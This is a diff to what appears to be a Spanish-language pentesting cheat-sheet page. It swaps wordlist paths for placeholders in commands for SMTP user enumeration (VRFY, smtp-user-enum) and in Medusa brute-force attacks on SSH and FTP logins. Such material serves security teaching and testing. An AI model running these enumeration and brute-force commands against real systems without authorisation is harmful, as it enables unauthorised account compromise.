@@ -116,7 +116,7 @@
             $ telnet IP 25
             $ HELO dominio.com
             $ VRFY usuario
-            $ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlist/unix_users.txt -t 192.168.1.1
+            $ smtp-user-enum -M VRFY -U /ruta/unix_users.txt -t 192.168.1.1
         </pre>
     </div>
 </section>
@@ -162,14 +162,14 @@
     <h3>Ataque de fuerza bruta a SSH con Medusa</h3>
     <div class="command-box">
         <pre>
-$ medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
+$ medusa -h 192.168.1.1 -u admin -P /ruta/rockyou.txt -M ssh
         </pre>
     </div>
 </section><section>
     <h3>Ataque de fuerza bruta a FTP con Medusa</h3>
     <div class="command-box">
         <pre>
-            $ medusa -h 192.168.1.1 -U /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt -M ftp
+            $ medusa -h 192.168.1.1 -U /ruta/users.txt -P /ruta/rockyou.txt -M ftp
         </pre>
     </div>
 </section>
